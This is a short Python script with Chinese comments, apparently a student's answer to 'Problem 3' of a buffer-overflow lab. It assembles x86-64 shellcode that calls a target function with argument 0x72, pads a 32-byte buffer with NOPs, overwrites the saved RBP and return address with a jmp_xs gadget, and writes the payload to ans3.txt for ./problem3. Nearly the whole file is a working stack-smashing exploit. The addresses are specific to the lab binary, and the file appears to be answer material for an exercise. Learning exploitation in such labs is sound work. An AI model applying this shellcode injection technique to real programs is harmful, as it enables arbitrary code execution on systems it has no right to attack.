import struct

# Problem 3 攻击脚本 (Shellcode)

# 1. 构造 Shellcode
# 汇编指令:
# mov rdi, 0x72       (参数 114)
# mov rax, 0x401216   (目标函数 func1)
# call rax            (执行)

# 对应的机器码 (Hex):
shellcode = b"\x48\xc7\xc7\x72\x00\x00\x00"  # mov rdi, 0x72
shellcode += b"\x48\xc7\xc0\x16\x12\x40\x00" # mov rax, 0x401216
shellcode += b"\xff\xd0"                     # call rax

# 2. 计算 Padding
# 缓冲区总大小是 32 字节 (0x20)
# 我们需要用 NOP (\x90) 或者垃圾数据填满剩余空间
buffer_size = 32
pad_len = buffer_size - len(shellcode)
padding = b'\x90' * pad_len # 使用 NOP 填充比较优雅

# 3. 构造栈帧覆盖
# [Shellcode + Pad] (32 bytes)
# [Old RBP] (8 bytes)
# [Ret Addr -> jmp_xs] (8 bytes)

fake_rbp = b'B' * 8
jmp_xs_addr = struct.pack('<Q', 0x401334) # 0x401334 是 jmp_xs 的地址

payload = shellcode + padding + fake_rbp + jmp_xs_addr

# 4. 写入文件
filename = "ans3.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"[+] Payload 已写入 {filename}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
print(f"[+] 跳转路径: func -> jmp_xs (0x401334) -> Stack Buffer")
print("-" * 30)
print(f"请在终端运行: ./problem3 {filename}")
